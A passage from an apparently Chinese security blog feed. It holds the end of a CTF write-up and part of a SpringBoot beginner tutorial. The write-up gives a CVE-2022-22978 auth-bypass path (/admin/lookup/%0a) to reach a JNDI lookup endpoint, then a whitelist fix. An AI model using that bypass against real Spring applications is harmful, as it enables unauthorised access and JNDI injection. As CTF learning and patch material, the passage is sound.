punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>IndexController.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">IndexController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">IndexController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"index"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>EzSpringApplication.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EzSpringApplication</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">EzSpringApplication</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">EzSpringApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>SecurityConfig.class</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Configuration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>builders<span class="token punctuation">.</span></span><span class="token class-name">HttpSecurity</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configuration<span class="token punctuation">.</span></span><span class="token class-name">EnableWebSecurity</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>config<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>web<span class="token punctuation">.</span>configurers<span class="token punctuation">.</span></span><span class="token class-name">ExpressionUrlAuthorizationConfigurer</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>security<span class="token punctuation">.</span>web<span class="token punctuation">.</span></span><span class="token class-name">SecurityFilterChain</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Configuration</span><span class="token annotation punctuation">@EnableWebSecurity</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityConfig</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">SecurityFilterChain</span> <span class="token function">securityFilterChain</span><span class="token punctuation">(</span><span class="token class-name">HttpSecurity</span> http<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        http<span class="token punctuation">.</span><span class="token function">authorizeRequests</span><span class="token punctuation">(</span><span class="token punctuation">(</span>authorize<span class="token punctuation">)</span> <span class="token operator">-></span> <span class="token punctuation">&#123;</span>            <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ExpressionUrlAuthorizationConfigurer<span class="token punctuation">.</span>AuthorizedUrl</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ExpressionUrlAuthorizationConfigurer<span class="token punctuation">.</span>AuthorizedUrl</span><span class="token punctuation">)</span>authorize<span class="token punctuation">.</span><span class="token function">regexMatchers</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"/admin/.*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">authenticated</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">anyRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">permitAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">csrf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">disable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">SecurityFilterChain</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显，第一步首先要绕过spring security的限制访问admin路由</p><p>看一下spring-security包的版本，5.6.2</p><p>直接用<a href="https://xz.aliyun.com/t/13235">CVE-2022-22978</a>绕过，访问<code>/admin/lookup/%0a</code>即可进入到lookup</p><p>然后看lookup的操作：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token string">"Lookup successful: "</span> <span class="token operator">+</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼jndi</p><h3 id="FIX-1"><a href="#FIX-1" class="headerlink" title="FIX"></a>FIX</h3><p>直接让GPT-4o代工，然后自己打包</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>ezspring<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">Context</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">InitialContext</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestParam</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">ResponseBody</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Set</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashSet</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@Controller</span><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/admin"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AdminController</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Pattern</span> <span class="token constant">SAFE_URL_PATTERN</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"^[a-zA-Z0-9:/._-]+$"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> <span class="token constant">ALLOWED_URLS</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Populate the whitelist with allowed JNDI URLs</span>        <span class="token constant">ALLOWED_URLS</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"java:comp/env/jdbc/myDataSource"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Add other allowed URLs here</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">AdminController</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"/lookup/*"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ResponseBody</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token annotation punctuation">@RequestParam</span><span class="token punctuation">(</span>value <span class="token operator">=</span> <span class="token string">"url"</span><span class="token punctuation">,</span> required <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token class-name">String</span> url<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>url <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"missing url parameter"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Validate the URL input against the pattern</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">SAFE_URL_PATTERN</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"Invalid URL format"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Check if the URL is in the whitelist</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token constant">ALLOWED_URLS</span><span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string">"URL not allowed"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Context</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> result <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"Lookup successful: "</span> <span class="token operator">+</span> result<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            ex<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token string">"Lookup failed"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="mycms（Unsolved）"><a href="#mycms（Unsolved）" class="headerlink" title="mycms（Unsolved）"></a>mycms（Unsolved）</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;个人名称：雲流&lt;/p&gt;
&lt;p&gt;个人排名：68&lt;/p&gt;
&lt;p&gt;签到题都做不来有点难绷&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>SpringBoot</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/06/28/SpringBoot/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/06/28/SpringBoot/</id>
    <published>2024-06-28T04:17:55.000Z</published>
    <updated>2024-07-09T15:45:38.649Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开发与安全缺一不可，虽然不知道自己到底少学了多少基础，但是现在就先跟着<a href="https://github.com/Drun1baby/JavaSecurityLearning?tab=readme-ov-file">Drun1baby的学习路线</a>吧</p><p>java第一步，先学SpringBoot，同时我这里也会稍微学一下Spring和SpringMVC</p><p>参考：</p><p><a href="https://www.bilibili.com/video/BV1PE411i7CV">https://www.bilibili.com/video/BV1PE411i7CV</a></p><p><a href="https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf">https://www.yuque.com/boogipop/ot88z5/bho0otrcaa8kl1xf</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628122350310.png" alt="image-20240628122350310"></p><span id="more"></span><hr><h1 id="Spring"><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1><p>Spring是一个分层的 JavaSE&#x2F;EE full-stack(一站式) 轻量级开源框架，可以说是给Java程序员带来了春天，因为它的优点是极大地简化了开发</p><p>Spring的理念：不去重新发明轮子。其核心是<strong>控制反转（IOC）和面向切面（AOP）。</strong></p><h2 id="IOC"><a href="#IOC" class="headerlink" title="IOC"></a>IOC</h2><hr><h1 id="SpringMVC"><a href="#SpringMVC" class="headerlink" title="SpringMVC"></a>SpringMVC</h1><h2 id="MVC架构"><a href="#MVC架构" class="headerlink" title="MVC架构"></a>MVC架构</h2><p>之前学习ThinkPHP的时候我们就接触到MVC架构了</p><p>MVC是<strong>Model、View、Controller</strong>的缩写，他们三者的意思分别为：</p><ul><li>Model（模型）：程序员需要操纵的数据以及信息，也就是数据库</li><li>View（视图）：提供用户前端展示界面，是程序的外壳</li><li>Controller（控制器）：他负责根据用户从视图层输入的指令，选取数据层中的数据，然后进行对应的操作，最终产生结果</li></ul><p>所以顺序分别是<code>View-&gt;Controller-&gt;Model</code>，由外到里</p><p>在SpringMVC中这三者分别就对应<code>Servlet</code>，<code>JSP</code>，<code>JavaBean</code></p><hr><h2 id="Controller配置"><a href="#Controller配置" class="headerlink" title="Controller配置"></a>Controller配置</h2><p><code>@RestController</code>注解：放在类上就相当于给每个方法都加了<code>Responsebody</code>注解，加上了<code>Responsebody</code>注解后就是单纯返回一个字符串</p><p><code>@RequestMapping</code>注解：可以用来设置路由，这个注解是放在方法上面的，但同时也可以放在一个类上，<code>GetMapping</code>即以get方式访问，<code>PostMapping</code>即以post方式访问</p><hr><h1 id="SpringBoot"><a href="#SpringBoot" class="headerlink" title="SpringBoot"></a>SpringBoot</h1><p>核心思想：<strong>约定大于配置</strong></p><p>默认帮我们进行了很多设置，多数 Spring Boot 应用只需要很少的 Spring 配置，同时继承了大量常用的第三方库配置（如 Redis），这些第三方库几乎可以零配置开箱即用</p><h2 id="微服务架构"><a href="#微服务架构" class="headerlink" title="微服务架构"></a>微服务架构</h2><p>微服务是一种架构风格，它要求我们在开发一个应用的时候，这个应用必须构建成一系列小服务的组合，可以用http的方式进行互通</p><blockquote><p>单体应用架构（all in one）：一个应用中的所有应用服务都封装在一个应用中，无论是ERP、CRM等系统，都把数据库访问、web访问等功能都放到一个war包内</p></blockquote><p>而微服务架构打破了 all in one 的架构方式，把每个功能元素独立出来，把独立出来的功能元素进行动态组合</p><p>最初的架构图：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628131837088.png" alt="image-20240628131837088"></p><p>随着需求变多，用户量变大，数据库公用可能出现冲突矛盾，因此微服务架构诞生，其架构图：</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628131932293.png" alt="image-20240628131932293"></p><p>如果需要修改其中的一个功能，只需要更新升级其中一个功能服务单元即可</p><hr><h2 id="第一个SpringBoot程序"><a href="#第一个SpringBoot程序" class="headerlink" title="第一个SpringBoot程序"></a>第一个SpringBoot程序</h2><p>喜报：官方已经提供了一个快速生成SpringBoot的网站：<a href="https://start.spring.io/">https://start.spring.io/</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628135947174.png" alt="image-20240628135947174"></p><p>SNAPSHOT是快照版本，右上角可以添加依赖，这里是添加了个web依赖（包括web.xml，tomcat等），generate后会下载一个zip文件，然后导入到IDE即可</p><p>当然IDEA也集成了这个网站</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628135431282.png" alt="image-20240628135431282"></p><p>注意：Spring Boot 3.0.0后只使用Java 17以上的版本，而官方源不再支持3.0以下的版本，如果我们要使用jdk1.8来创建则需要换源为阿里云：<a href="https://start.aliyun.com/">https://start.aliyun.com/</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240628140506089.png" alt="image-20240628140506089"></p><p>设置spring boot版本和依赖</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240629203344403.png" alt="image-20240629203344403"></p><p>于是就直接创建了，然后依赖的jar包会自动进行下载</p><h3 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h3><p><img src="/blog/2024/06/28/SpringBoot/image-20240708174238564.png" alt="image-20240708174238564"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">├─.idea│  └─libraries├─.mvn│  └─wrapper├─src│  ├─main│  │  ├─java│  │  │  └─com│  │  │      └─example│  │  │          └─demo│  │  └─resources│  │      ├─static│  │      └─templates│  └─test│      └─java│          └─com│              └─example│                  └─demo└─target    ├─classes    │  └─com    │      └─example    │          └─demo    └─generated-sources        └─annotations<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的Application.java文件就是我们SpringBoot的主程序，即程序的主入口，之后启动web服务器就是运行这个文件</p><p>SpringBoot本质上还是一个Tomcat程序，它内置了tomcat服务器，并且经过了改动，因此启动比Tomcat迅速许多</p><p>pom.xml的依赖中，<code>org.springframework.boot</code>包括了tomcat，dispatcherServlet，xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework.boot<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-boot-starter-web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来尝试运行，访问本地的8080端口</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240708174526239.png" alt="image-20240708174526239"></p><p>此时我们还没添加任何的静态资源和controller，所以返回404</p><hr><h3 id="创建一个简单的controller"><a href="#创建一个简单的controller" class="headerlink" title="创建一个简单的controller"></a>创建一个简单的controller</h3><p>在 Application.java 的同级目录下创建一个controller package，然后在里面写一个HelloController.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>demo<span class="token punctuation">.</span>controller</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span></span><span class="token class-name">Controller</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RequestMapping</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>web<span class="token punctuation">.</span>bind<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">RestController</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@RestController</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloController</span> <span class="token punctuation">&#123;</span>    <span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/hello"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// 调用业务，接收前端参数</span>        <span class="token keyword">return</span> <span class="token string">"hello,world"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就创建了一个接口：<a href="http://localhost:8080/hello">http://localhost:8080/hello</a></p><p><img src="/blog/2024/06/28/SpringBoot/image-20240708181144025.png" alt="image-20240708181144025"></p><p>成功访问</p><hr><h3 id="配置端口"><a href="#配置端口" class="headerlink" title="配置端口"></a>配置端口</h3><p>在application.properties里添加<code>server.port</code>即可指定端口</p><hr><h3 id="SpringBoot自动装配原理"><a href="#SpringBoot自动装配原理" class="headerlink" title="SpringBoot自动装配原理"></a>SpringBoot自动装配原理</h3><p>没怎么学Spring，一时半会还感受不到SpringBoot的核心魅力</p><p>先放个参考文章在这：<a href="https://www.cnblogs.com/javaguide/p/springboot-auto-config.html">https://www.cnblogs.com/javaguide/p/springboot-auto-config.html</a></p><hr><h2 id="Yaml语法"><a href="#Yaml语法" class="headerlink" title="Yaml语法"></a>Yaml语法</h2><p>编Docker-compose，配置hexo博客时已经非常熟悉了，这边粗略写点基本的语法</p><h3 id="语法特点"><a href="#语法特点" class="headerlink" 